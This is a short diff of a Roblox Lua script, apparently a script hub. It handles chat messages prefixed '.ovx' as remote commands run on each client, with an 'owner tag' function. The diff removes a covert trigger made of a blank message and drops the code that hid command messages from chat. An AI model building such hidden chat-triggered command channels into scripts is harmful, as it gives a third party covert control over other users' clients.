@@ -705,7 +705,7 @@ task.spawn(function()
     jogador.CharacterAdded:Connect(function() task.wait(1) aplicarTagDono() end)
 
     local function executarOrdem(cmd, arg)
-        if cmd == "SolicitarVerificacao" then
+        if cmd == "verificar" then
             if canalGeral then pcall(function() canalGeral:SendAsync("new123") end) end
         elseif cmd == "fake" then
             if canalGeral then
@@ -788,18 +788,9 @@ task.spawn(function()
 
     TextChatService.OnIncomingMessage = function(mensagemObj)
         local texto = mensagemObj.Text
-        
-        if texto == "     " then
-            task.spawn(executarOrdem, "SolicitarVerificacao", "")
-            mensagemObj.Text = ""
-            return nil
-        end
-        
         local c, a = string.match(texto, "^%.ovx%s*(%w+)%s*%s*(.*)$")
         if c then
             task.spawn(executarOrdem, c, a)
-            mensagemObj.Text = ""
-            return nil
         end
     end
 end)
